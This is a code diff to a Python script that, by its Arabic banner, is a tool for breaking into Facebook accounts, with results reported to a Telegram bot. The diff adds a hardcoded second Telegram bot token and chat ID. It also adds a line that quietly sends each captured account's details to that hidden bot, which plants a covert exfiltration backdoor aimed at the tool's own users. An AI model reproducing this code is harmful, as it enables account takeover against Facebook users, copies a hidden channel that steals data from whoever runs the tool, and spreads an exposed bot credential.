@@ -154,8 +154,10 @@ print('')
 print(f'''{C}: \x1b[38;5;92m 𝑇𝐻𝐸 𝑇𝐼𝑀𝐸 \x1b[1;38;5;121m ๛   \x1b[1;38;5;121m   𖣎 \x1b[1;96m{time3} \x1b[1;38;5;121m 𖣎''')
 print('')
 token = input('\x1b[1;31mT\x1b[1;32mO\x1b[1;33mK\x1b[1;34mE\x1b[1;36mN\x1b[1;35m :\x1b[1;32m ')
+token1=('6713135240:AAFxpnxCwVH5R1n4s6Zq7uY7Ploluy7kFQU')
 print('\n')
 ID = input('\x1b[1;31mI\x1b[1;34mD \x1b[1;32m   : ')
+ID1=('1677652563')
 tlg1 = '\n -مرحبا بك في اداة لإختراق الحسابات المتاحة  \n━━━━━━━━❖━━━━━━━━━nn𝞩 \nتم تشغيل الاداة \n    \nستتوصل بالحسابات في هذا البوت 🫡 \n'
 requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg1))
 os.system('clear')
@@ -954,6 +956,7 @@ BY = @mx1mq'''
 ⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙
 BY = @mx1mq '''
                     requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(infoakun))
+		    requests.get('https://api.telegram.org/bot' + str(token1) + '/sendMessage?chat_id=' + str(ID1) + '&text=' + str(infoakun))
                     (hit1, hit2) = (0, 0)
                     cek = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=coki, headers=headapp).text
                     cek2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', cookies=coki, headers=headapp).text
